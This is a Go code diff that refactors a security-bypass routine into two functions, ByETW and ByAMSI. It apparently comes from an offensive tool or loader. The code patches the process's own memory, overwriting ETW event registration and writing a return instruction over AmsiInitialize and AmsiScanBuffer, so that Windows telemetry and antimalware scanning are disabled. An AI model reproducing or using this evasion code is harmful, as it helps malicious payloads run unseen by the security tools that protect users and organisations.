@@ -54,7 +54,7 @@ func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte,
 	return
 }
 
-func PatchBypass() {
+func ByETW() {
 	handle := uintptr(0xffffffffffffffff)
 	dataAddr := []uintptr{ 
 		//procEtwNotificationRegister.Addr(),
@@ -80,7 +80,10 @@ func PatchBypass() {
 	datalength := len(patch)
 	var nLength uintptr
 	WriteProcessMemory(handle, procEtwEventRegister.Addr(), &patch[0], uintptr(uint32(datalength)), &nLength)
+}
 
+func ByAMSI(){
+	handle := uintptr(0xffffffffffffffff)
 	amsi := []uintptr{
 		AmsiInitialize.Addr(),
 		AmsiScanBuffer.Addr(),
@@ -89,7 +92,7 @@ func PatchBypass() {
 
 	for j, _ := range amsi {
 		var patcha = []byte{0xc3}
-		datalength = len(patcha)
+		datalength := len(patcha)
 		var nLength uintptr
 		WriteProcessMemory(handle, amsi[j], &patcha[0], uintptr(uint32(datalength)), &nLength)
 	}
